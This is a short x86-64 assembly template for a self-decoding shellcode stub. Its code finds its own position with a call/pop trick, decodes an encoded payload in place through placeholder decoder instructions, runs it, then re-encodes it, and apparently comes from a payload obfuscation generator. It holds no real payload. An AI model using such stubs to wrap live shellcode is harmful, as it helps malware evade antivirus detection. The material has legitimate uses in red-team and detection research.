[BITS 64]

SECTION .text
global _start		; make label available to linker
_start:
  call rel1
rel1:
  pop rbx
  add rbx,payload_data-rel1
  mov rcx, ENCODED_DATA_LEN
lp_arith_1:
  mov edx, [rbx]
  DECODER_CODE
  mov [rbx],edx
  add rbx, 4
  dec ecx
  jnz lp_arith_1
; Start of obfuscation
payload_data  dd PAYLOAD_ENCODED
; end of obfustation
  call rel2
rel2:
  pop rbx
  sub rbx,rel2-payload_data
  mov rcx, ENCODED_DATA_LEN
lp_arith_2:
  mov edx, [rbx]
  ENCODER_CODE
  mov [rbx],edx
  add rbx, 4
  dec ecx
  jnz lp_arith_2
